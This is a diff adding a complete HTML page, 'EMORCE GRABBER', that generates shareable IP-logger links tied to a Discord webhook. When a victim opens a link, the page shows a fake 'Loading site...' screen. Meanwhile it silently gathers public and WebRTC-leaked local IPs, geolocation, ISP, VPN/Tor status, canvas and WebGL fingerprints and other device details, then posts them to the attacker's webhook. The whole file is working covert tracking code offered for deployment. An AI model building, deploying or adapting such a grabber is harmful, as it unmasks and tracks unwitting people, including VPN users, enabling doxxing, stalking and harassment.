@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EMORCE GRABBER · Personal Link Generator</title>
+    <link rel="icon" type="image/jpeg" href="https://i.pinimg.com/736x/42/de/d5/42ded506cb69f48fad09de00cdf3e54f.jpg">
+    <link rel="apple-touch-icon" href="https://i.pinimg.com/736x/42/de/d5/42ded506cb69f48fad09de00cdf3e54f.jpg">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --red: #ff1a1a;
+            --red-glow: #ff3333;
+            --dark: #050508;
+            --card: #0c0e14;
+            --border: rgba(255, 26, 26, 0.35);
+            --text: #e8e8f0;
+            --muted: #8a8fa8;
+        }
+        body {
+            background: radial-gradient(ellipse at 20% 20%, #1a0508 0%, #050508 45%, #0a0a12 100%);
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            color: var(--text);
+            overflow-x: hidden;
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(circle at 15% 30%, rgba(255, 26, 26, 0.08) 0%, transparent 40%),
+                radial-gradient(circle at 85% 70%, rgba(180, 0, 30, 0.06) 0%, transparent 35%);
+            pointer-events: none;
+            z-index: 0;
+        }
+        .glow-orb {
+            position: fixed;
+            width: 420px;
+            height: 420px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(255, 40, 40, 0.18) 0%, transparent 70%);
+            filter: blur(60px);
+            top: -120px;
+            right: -80px;
+            pointer-events: none;
+            animation: pulseOrb 6s ease-in-out infinite;
+            z-index: 0;
+        }
+        .glow-orb2 {
+            position: fixed;
+            width: 320px;
+            height: 320px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(200, 0, 40, 0.12) 0%, transparent 70%);
+            filter: blur(50px);
+            bottom: -80px;
+            left: -60px;
+            pointer-events: none;
+            animation: pulseOrb 8s ease-in-out infinite reverse;
+            z-index: 0;
+        }
+        @keyframes pulseOrb {
+            0%, 100% { opacity: 0.7; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.08); }
+        }
+        .card {
+            background: linear-gradient(165deg, rgba(16, 18, 28, 0.97) 0%, rgba(10, 11, 18, 0.98) 100%);
+            backdrop-filter: blur(18px);
+            border-radius: 36px;
+            padding: 44px 36px;
+            max-width: 580px;
+            width: 100%;
+            box-shadow:
+                0 0 0 1px var(--border),
+                0 0 40px rgba(255, 26, 26, 0.12),
+                0 25px 50px -12px rgba(0,0,0,0.75);
+            border: 1px solid rgba(255, 50, 50, 0.25);
+            position: relative;
+            z-index: 1;
+            overflow: hidden;
+        }
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--red), transparent);
+            opacity: 0.9;
+        }
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 8px;
+        }
+        .brand-icon {
+            width: 52px;
+            height: 52px;
+            border-radius: 14px;
+            object-fit: cover;
+            border: 2px solid var(--red);
+            box-shadow: 0 0 18px rgba(255, 26, 26, 0.55), 0 0 40px rgba(255, 26, 26, 0.25);
+            animation: iconGlow 2.8s ease-in-out infinite;
+        }
+        @keyframes iconGlow {
+            0%, 100% { box-shadow: 0 0 14px rgba(255, 26, 26, 0.45), 0 0 28px rgba(255, 26, 26, 0.2); }
+            50% { box-shadow: 0 0 22px rgba(255, 40, 40, 0.75), 0 0 48px rgba(255, 26, 26, 0.4); }
+        }
+        h1 {
+            font-size: 1.95rem;
+            font-weight: 800;
+            background: linear-gradient(120deg, #ff6b6b, #ff1a1a 45%, #ff4d4d);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.6px;
+            text-shadow: 0 0 30px rgba(255, 26, 26, 0.3);
+        }
+        .sub {
+            color: var(--muted);
+            margin-bottom: 28px;
+            margin-top: 6px;
+            font-size: 0.92rem;
+            border-left: 3px solid var(--red);
+            padding-left: 14px;
+            line-height: 1.45;
+        }
+        label {
+            display: block;
+            font-weight: 600;
+            color: #f0c0c0;
+            margin-bottom: 8px;
+            font-size: 0.88rem;
+            letter-spacing: 0.2px;
+        }
+        .input-group {
+            background: #06070c;
+            border-radius: 22px;
+            border: 1px solid #2a1a1e;
+            overflow: hidden;
+            margin-bottom: 22px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .input-group:focus-within {
+            border-color: var(--red);
+            box-shadow: 0 0 0 3px rgba(255, 26, 26, 0.18), 0 0 20px rgba(255, 26, 26, 0.12);
+        }
+        input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            padding: 16px 20px;
+            color: #fff;
+            font-family: ui-monospace, 'Cascadia Code', 'Consolas', monospace;
+            font-size: 0.88rem;
+            outline: none;
+        }
+        input::placeholder { color: #4a4e62; }
+        button.primary {
+            background: linear-gradient(135deg, #e01010 0%, #b00000 100%);
+            width: 100%;
+            border: none;
+            padding: 15px 20px;
+            border-radius: 9999px;
+            font-weight: 700;
+            font-size: 1rem;
+            color: white;
+            cursor: pointer;
+            transition: transform 0.15s, box-shadow 0.2s, filter 0.2s;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 0 22px rgba(255, 26, 26, 0.35), 0 4px 14px rgba(0,0,0,0.4);
+            letter-spacing: 0.3px;
+        }
+        button.primary:hover {
+            filter: brightness(1.12);
+            box-shadow: 0 0 32px rgba(255, 40, 40, 0.5), 0 6px 18px rgba(0,0,0,0.45);
+            transform: translateY(-1px);
+        }
+        button.primary:active { transform: translateY(0); }
+        .result-area {
+            background: #05060a;
+            border-radius: 22px;
+            padding: 18px 18px 16px;
+            margin-top: 4px;
+            border: 1px solid #2a1a20;
+            box-shadow: inset 0 0 30px rgba(255, 26, 26, 0.04);
+        }
+        .result-label {
+            font-size: 0.68rem;
+            text-transform: uppercase;
+            letter-spacing: 1.4px;
+            color: #7a5a5a;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        .link-box {
+            background: #010103;
+            padding: 13px 15px;
+            border-radius: 14px;
+            font-family: ui-monospace, monospace;
+            font-size: 0.78rem;
+            word-break: break-all;
+            color: #ffb0b0;
+            margin-bottom: 12px;
+            border: 1px solid #3a1a20;
+            line-height: 1.4;
+            max-height: 90px;
+            overflow-y: auto;
+        }
+        .copy-btn {
+            background: #1a1014;
+            padding: 11px;
+            font-size: 0.82rem;
+            font-weight: 600;
+            width: 100%;
+            border: 1px solid #3a2028;
+            border-radius: 9999px;
+            color: #ffc0c0;
+            cursor: pointer;
+            transition: background 0.15s, border-color 0.15s;
+        }
+        .copy-btn:hover {
+            background: #2a1518;
+            border-color: var(--red);
+        }
+        .note {
+            font-size: 0.72rem;
+            color: #4a4e62;
+            text-align: center;
+            margin-top: 26px;
+            border-top: 1px solid #1e1520;
+            padding-top: 18px;
+            line-height: 1.5;
+        }
+        .features {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 22px;
+        }
+        .feat {
+            background: rgba(255, 26, 26, 0.06);
+            border: 1px solid rgba(255, 40, 40, 0.15);
+            border-radius: 12px;
+            padding: 9px 11px;
+            font-size: 0.72rem;
+            color: #c0a0a8;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .feat span { color: var(--red); font-weight: 700; }
+        .loading-screen {
+            text-align: center;
+            padding: 80px 24px;
+            color: #aaa;
+            font-size: 1.35rem;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: #050508;
+        }
+        .loading-screen .spinner {
+            width: 48px;
+            height: 48px;
+            border: 3px solid #2a1518;
+            border-top-color: var(--red);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 24px;
+            box-shadow: 0 0 20px rgba(255, 26, 26, 0.3);
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .captured {
+            text-align: center;
+            padding: 70px 28px;
+            background: #050508;
+            color: #ddd;
+            min-height: 100vh;
+            font-family: system-ui, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .captured h1 {
+            font-size: 2.2rem;
+            margin-bottom: 12px;
+            background: linear-gradient(120deg, #ff6b6b, #ff1a1a);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .captured p { color: #888; font-size: 1rem; }
+        .captured .check {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: rgba(255, 26, 26, 0.15);
+            border: 2px solid var(--red);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            box-shadow: 0 0 28px rgba(255, 26, 26, 0.35);
+        }
+    </style>
+</head>
+<body>
+<div class="glow-orb"></div>
+<div class="glow-orb2"></div>
+<script>
+(function() {
+    const ICON = "https://i.pinimg.com/736x/42/de/d5/42ded506cb69f48fad09de00cdf3e54f.jpg";
+    const urlParams = new URLSearchParams(window.location.search);
+    let rawWebhookParam = urlParams.get('webhook');
+
+    if (rawWebhookParam) {
+        runGrabberMode(rawWebhookParam);
+        return;
+    }
+
+    // ========== GENERATOR UI ==========
+    document.body.innerHTML = `
+        <div class="glow-orb"></div>
+        <div class="glow-orb2"></div>
+        <div class="card">
+            <div class="brand">
+                <img class="brand-icon" src="${ICON}" alt="emorce" onerror="this.style.display='none'">
+                <h1>EMORCE GRABBER</h1>
+            </div>
+            <div class="sub">generate your personal IP logger link — base64 encoded & ready to share. full IPv4 · IPv6 · VPN · geo · fingerprint.</div>
+            <div class="features">
+                <div class="feat"><span>●</span> IPv4 + IPv6</div>
+                <div class="feat"><span>●</span> VPN / Proxy detect</div>
+                <div class="feat"><span>●</span> WebRTC local IPs</div>
+                <div class="feat"><span>●</span> Full geo + ISP</div>
+                <div class="feat"><span>●</span> Device fingerprint</div>
+                <div class="feat"><span>●</span> Discord embed + icon</div>
+            </div>
+            <label>🔗 your discord webhook URL</label>
+            <div class="input-group">
+                <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false">
+            </div>
+            <button class="primary" id="generateBtn">⚡ generate your secure link</button>
+            <div id="resultPanel" style="display:none;">
+                <div class="result-area">
+                    <div class="result-label">YOUR PERSONAL GRABBER LINK (BASE64 ENCODED)</div>
+                    <div class="link-box" id="generatedLink"></div>
+                    <button id="copyLinkBtn" class="copy-btn">📋 copy link</button>
+                </div>
+            </div>
+            <div class="note">anyone who opens your link → full visitor data sent to YOUR webhook<br>host this single HTML on GitHub Pages / Netlify / any static host</div>
+        </div>
+    `;
+
+    const webhookInput = document.getElementById('webhookInput');
+    const generateBtn = document.getElementById('generateBtn');
+    const resultPanel = document.getElementById('resultPanel');
+    const generatedLink = document.getElementById('generatedLink');
+    const copyBtn = document.getElementById('copyLinkBtn');
+
+    generateBtn.addEventListener('click', () => {
+        let webhook = webhookInput.value.trim();
+        if (!webhook.startsWith('https://discord.com/api/webhooks/') && !webhook.startsWith('https://discordapp.com/api/webhooks/')) {
+            alert("Please enter a valid Discord webhook URL");
+            return;
+        }
+        const encoded = btoa(webhook);
+        const baseUrl = window.location.href.split('?')[0].split('#')[0];
+        const finalLink = `${baseUrl}?webhook=${encodeURIComponent(encoded)}`;
+        generatedLink.textContent = finalLink;
+        resultPanel.style.display = 'block';
+    });
+
+    copyBtn.addEventListener('click', () => {
+        navigator.clipboard.writeText(generatedLink.textContent).then(() => {
+            const orig = copyBtn.textContent;
+            copyBtn.textContent = '✅ Copied!';
+            setTimeout(() => copyBtn.textContent = orig, 2000);
+        }).catch(() => {
+            // fallback
+            const ta = document.createElement('textarea');
+            ta.value = generatedLink.textContent;
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            document.body.removeChild(ta);
+            copyBtn.textContent = '✅ Copied!';
+            setTimeout(() => copyBtn.textContent = '📋 copy link', 2000);
+        });
+    });
+
+    // ========== FULL GRABBER MODE ==========
+    async function runGrabberMode(param) {
+        document.body.innerHTML = `
+            <div class="loading-screen">
+                <div class="spinner"></div>
+                <div>Loading site...</div>
+            </div>
+        `;
+
+        let webhookUrl = param;
+        if (!webhookUrl.startsWith('https://')) {
+            try { webhookUrl = atob(webhookUrl); } catch(e) {}
+        }
+
+        const data = {
+            public_ipv4: "unknown",
+            public_ipv6: "none",
+            geo: {},
+            vpn: { is_vpn: false, is_proxy: false, is_tor: false, is_hosting: false, risk: "low", details: "unknown" },
+            ua: navigator.userAgent,
+            platform: navigator.platform || "unknown",
+            language: navigator.language || "unknown",
+            languages: (navigator.languages || []).join(", ") || "unknown",
+            cookie: navigator.cookieEnabled,
+            cpu: navigator.hardwareConcurrency || "unknown",
+            memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unknown",
+            screen: `${screen.width}x${screen.height} @ ${screen.colorDepth}bit`,
+            availScreen: `${screen.availWidth}x${screen.availHeight}`,
+            viewport: `${window.innerWidth}x${window.innerHeight}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
+            localTime: new Date().toString(),
+            referrer: document.referrer || "direct",
+            localIPs: [],
+            publicFromWebRTC: [],
+            webgl: getWebGLInfo(),
+            canvasHash: getCanvasHash(),
+            connection: getConnectionInfo(),
+            battery: "unknown",
+            touch: navigator.maxTouchPoints || 0,
+            doNotTrack: navigator.doNotTrack || "unknown",
+            plugins: getPlugins(),
+            unix: Date.now(),
+            href: location.href
+        };
+
+        // parallel fetches
+        const tasks = [];
+
+        // IPv4 via ipify
+        tasks.push(
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(j => { data.public_ipv4 = j.ip || "unknown"; })
+                .catch(() => {})
+        );
+
+        // IPv6 via api64.ipify
+        tasks.push(
+            fetch('https://api64.ipify.org?format=json')
+                .then(r => r.json())
+                .then(j => {
+                    if (j.ip && j.ip.includes(':')) data.public_ipv6 = j.ip;
+                })
+                .catch(() => {})
+        );
+
+        // battery (async)
+        if (navigator.getBattery) {
+            tasks.push(
+                navigator.getBattery().then(b => {
+                    data.battery = `${Math.round(b.level * 100)}% ${b.charging ? '(charging)' : ''}`;
+                }).catch(() => {})
+            );
+        }
+
+        // wait a bit for IP first then geo
+        await Promise.allSettled(tasks);
+
+        // Geo + ISP + basic VPN signals (ipapi.co)
+        if (data.public_ipv4 && data.public_ipv4 !== "unknown") {
+            try {
+                const geoRes = await fetch(`https://ipapi.co/${data.public_ipv4}/json/`);
+                if (geoRes.ok) {
+                    data.geo = await geoRes.json();
+                }
+            } catch(e) {}
+
+            // secondary: ip-api (http only – may fail on https pages, try anyway)
+            try {
+                const extra = await fetch(`https://ipapi.co/${data.public_ipv4}/json/`);
+                // already used above
+            } catch(e) {}
+        }
+
+        // VPN / Proxy / Hosting heuristics from geo fields + extra calls
+        data.vpn = detectVpnSignals(data);
+
+        // WebRTC local + public candidates
+        await collectWebRTC(data);
+
+        // refine VPN after WebRTC
+        refineVpnFromWebRTC(data);
+
+        // build rich Discord embed
+        const locationStr = [
+            data.geo.city || "Unknown",
+            data.geo.region || data.geo.region_code || "",
+            data.geo.country_name || data.geo.country || ""
+        ].filter(Boolean).join(", ");
+
+        const vpnStatus = data.vpn.is_vpn || data.vpn.is_proxy || data.vpn.is_tor
+            ? `YES — ${data.vpn.details}`
+            : `NO — appears clean`;
+
+        const ipv6Display = data.public_ipv6 && data.public_ipv6 !== "none"
+            ? data.public_ipv6
+            : (data.publicFromWebRTC.find(ip => ip.includes(':')) || "none detected");
+
+        const embed = {
+            username: "EMORCE GRABBER",
+            avatar_url: ICON,
+            embeds: [{
+                title: "🎯 EMORCE GRABBER · VISITOR CAPTURED",
+                color: 0xff1a1a,
+                thumbnail: { url: ICON },
+                image: { url: ICON },
+                fields: [
+                    { name: "🌐 Public IPv4", value: `\`${data.public_ipv4}\``, inline: true },
+                    { name: "🟣 Public IPv6", value: `\`${ipv6Display}\``, inline: true },
+                    { name: "🛡️ VPN / Proxy / Tor", value: vpnStatus, inline: true },
+                    { name: "📍 Location", value: locationStr || "Unknown", inline: true },
+                    { name: "📡 ISP / Org", value: data.geo.org || data.geo.asn || "Unknown", inline: true },
+                    { name: "🏢 Hosting / DC", value: data.vpn.is_hosting ? "YES (datacenter)" : "NO (likely residential)", inline: true },
+                    { name: "🖥️ User Agent", value: "```" + (data.ua || "").substring(0, 180) + "```", inline: false },
+                    { name: "💻 Platform", value: String(data.platform), inline: true },
+                    { name: "🗣️ Language", value: String(data.language), inline: true },
+                    { name: "🍪 Cookies", value: data.cookie ? "✅ enabled" : "❌ disabled", inline: true },
+                    { name: "🧠 CPU Cores", value: String(data.cpu), inline: true },
+                    { name: "💾 Device Memory", value: String(data.memory), inline: true },
+                    { name: "📺 Screen", value: data.screen, inline: true },
+                    { name: "🪟 Viewport", value: data.viewport, inline: true },
+                    { name: "🌍 Timezone", value: data.timezone, inline: true },
+                    { name: "🕒 Local Time", value: data.localTime, inline: false },
+                    { name: "🔗 Referrer", value: data.referrer || "direct", inline: false },
+                    { name: "🕵️ Local / LAN IPs (WebRTC)", value: data.localIPs.length ? data.localIPs.join(", ") : "none / blocked", inline: false },
+                    { name: "🔓 WebRTC Public Candidates", value: data.publicFromWebRTC.length ? data.publicFromWebRTC.join(", ") : "none", inline: false },
+                    { name: "🎨 WebGL / GPU", value: data.webgl || "unknown", inline: false },
+                    { name: "🖼️ Canvas Hash", value: data.canvasHash || "n/a", inline: true },
+                    { name: "📶 Connection", value: data.connection || "unknown", inline: true },
+                    { name: "🔋 Battery", value: data.battery, inline: true },
+                    { name: "👆 Touch Points", value: String(data.touch), inline: true },
+                    { name: "📅 Unix", value: String(data.unix), inline: true }
+                ],
+                footer: {
+                    text: "EMORCE GRABBER · personal link · " + new Date().toLocaleDateString(),
+                    icon_url: ICON
+                },
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        // send embed + short content message
+        try {
+            await fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(embed)
+            });
+            await fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    username: "EMORCE GRABBER",
+                    avatar_url: ICON,
+                    content: `**IPv4:** \`${data.public_ipv4}\` | **IPv6:** \`${ipv6Display}\` | **VPN:** ${vpnStatus.split('—')[0].trim()} | ${locationStr} | ${(data.ua || "").substring(0, 60)}...`
+                })
+            });
+        } catch(e) {}
+
+        document.body.innerHTML = `
+            <div class="captured">
+                <div class="check">✓</div>
+                <h1>Information Captured</h1>
+                <p>Your details have been sent.</p>
+            </div>
+        `;
+    }
+
+    function getWebGLInfo() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return "not supported";
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || "";
+                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "";
+                return (vendor + " | " + renderer).substring(0, 120);
+            }
+            return "WebGL available";
+        } catch(e) { return "error"; }
+    }
+
+    function getCanvasHash() {
+        try {
+            const c = document.createElement('canvas');
+            c.width = 200; c.height = 50;
+            const ctx = c.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(0, 0, 100, 50);
+            ctx.fillStyle = '#069';
+            ctx.fillText('emorce-fp', 2, 15);
+            ctx.fillStyle = 'rgba(102,204,0,0.7)';
+            ctx.fillText('emorce-fp', 4, 17);
+            const data = c.toDataURL();
+            let hash = 0;
+            for (let i = 0; i < data.length; i++) {
+                hash = ((hash << 5) - hash) + data.charCodeAt(i);
+                hash |= 0;
+            }
+            return Math.abs(hash).toString(16);
+        } catch(e) { return "n/a"; }
+    }
+
+    function getConnectionInfo() {
+        try {
+            const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!c) return "unknown";
+            return `${c.effectiveType || "?"} · ${c.downlink || "?"}Mbps · rtt ${c.rtt || "?"}ms`;
+        } catch(e) { return "unknown"; }
+    }
+
+    function getPlugins() {
+        try {
+            if (!navigator.plugins || !navigator.plugins.length) return "none";
+            const names = [];
+            for (let i = 0; i < Math.min(navigator.plugins.length, 6); i++) {
+                names.push(navigator.plugins[i].name);
+            }
+            return names.join(", ").substring(0, 100) || "none";
+        } catch(e) { return "n/a"; }
+    }
+
+    function detectVpnSignals(data) {
+        const result = {
+            is_vpn: false,
+            is_proxy: false,
+            is_tor: false,
+            is_hosting: false,
+            risk: "low",
+            details: "clean / residential"
+        };
+        const org = ((data.geo && (data.geo.org || data.geo.asn || data.geo.company || "")) + "").toLowerCase();
+        const hostingKeywords = [
+            "amazon", "aws", "google cloud", "gcp", "microsoft", "azure", "digitalocean",
+            "linode", "vultr", "ovh", "hetzner", "contabo", "cloudflare", "fastly",
+            "oracle cloud", "alibaba", "tencent", "scaleway", "hosting", "server",
+            "datacenter", "data center", "colocation", "vps", "dedicated"
+        ];
+        const vpnKeywords = [
+            "vpn", "proxy", "nord", "expressvpn", "mullvad", "proton", "surfshark",
+            "private internet", "cyberghost", "pia", "ipvanish", "tunnelbear",
+            "windscribe", "torguard", "hide.me", "purevpn", "zenmate", "hotspot shield",
+            "exit node", "anonymizer"
+        ];
+        for (const k of hostingKeywords) {
+            if (org.includes(k)) { result.is_hosting = true; break; }
+        }
+        for (const k of vpnKeywords) {
+            if (org.includes(k)) { result.is_vpn = true; result.details = "VPN/proxy keyword in org"; break; }
+        }
+        if (data.geo && (data.geo.threat || data.geo.security)) {
+            const t = data.geo.threat || data.geo.security;
+            if (t.is_vpn || t.vpn) result.is_vpn = true;
+            if (t.is_proxy || t.proxy) result.is_proxy = true;
+            if (t.is_tor || t.tor) result.is_tor = true;
+        }
+        if (result.is_vpn || result.is_proxy || result.is_tor) {
+            result.risk = "high";
+            result.details = [
+                result.is_vpn && "VPN",
+                result.is_proxy && "Proxy",
+                result.is_tor && "Tor"
+            ].filter(Boolean).join(" + ") || "suspicious";
+        } else if (result.is_hosting) {
+            result.risk = "medium";
+            result.details = "datacenter / hosting IP";
+        }
+        return result;
+    }
+
+    function refineVpnFromWebRTC(data) {
+        // if WebRTC public IP differs significantly from reported public IP → possible leak / split tunnel
+        if (data.publicFromWebRTC.length && data.public_ipv4 && data.public_ipv4 !== "unknown") {
+            const mismatch = data.publicFromWebRTC.some(ip => {
+                if (ip.includes(':')) return false; // skip ipv6 compare here
+                return ip !== data.public_ipv4;
+            });
+            if (mismatch) {
+                data.vpn.is_vpn = true;
+                data.vpn.risk = "high";
+                data.vpn.details = (data.vpn.details || "") + " · WebRTC IP mismatch (possible VPN/split-tunnel)";
+            }
+        }
+    }
+
+    function collectWebRTC(data) {
+        return new Promise((resolve) => {
+            const timeout = setTimeout(() => resolve(), 2800);
+            try {
+                const pc = new RTCPeerConnection({
+                    iceServers: [
+                        { urls: "stun:stun.l.google.com:19302" },
+                        { urls: "stun:stun1.l.google.com:19302" },
+                        { urls: "stun:stun.cloudflare.com:3478" }
+                    ]
+                });
+                pc.createDataChannel("");
+                const seen = new Set();
+
+                pc.onicecandidate = (e) => {
+                    if (!e.candidate || !e.candidate.candidate) return;
+                    const cand = e.candidate.candidate;
+                    // IPv4
+                    const v4 = cand.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                    // IPv6 rough
+                    const v6 = cand.match(/([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){2,7})/);
+                    const add = (ip) => {
+                        if (!ip || seen.has(ip)) return;
+                        seen.add(ip);
+                        if (isPrivateIP(ip)) {
+                            data.localIPs.push(ip);
+                        } else {
+                            data.publicFromWebRTC.push(ip);
+                        }
+                    };
+                    if (v4) add(v4[1]);
+                    if (v6) add(v6[1]);
+                };
+
+                pc.createOffer()
+                    .then(o => pc.setLocalDescription(o))
+                    .catch(() => {});
+
+                setTimeout(() => {
+                    try { pc.close(); } catch(e) {}
+                    clearTimeout(timeout);
+                    resolve();
+                }, 2500);
+            } catch(e) {
+                clearTimeout(timeout);
+                resolve();
+            }
+        });
+    }
+
+    function isPrivateIP(ip) {
+        if (ip.includes(':')) {
+            // simple IPv6 private / link-local
+            const lower = ip.toLowerCase();
+            return lower.startsWith('fc') || lower.startsWith('fd') || lower.startsWith('fe80') || lower === '::1';
+        }
+        const parts = ip.split('.').map(Number);
+        if (parts.length !== 4) return false;
+        if (parts[0] === 10) return true;
+        if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
+        if (parts[0] === 192 && parts[1] === 168) return true;
+        if (parts[0] === 127) return true;
+        if (parts[0] === 169 && parts[1] === 254) return true;
+        if (parts[0] === 100 && parts[1] >= 64 && parts[1] <= 127) return true; // CGNAT
+        return false;
+    }
+})();
+</script>
+</body>
+</html>
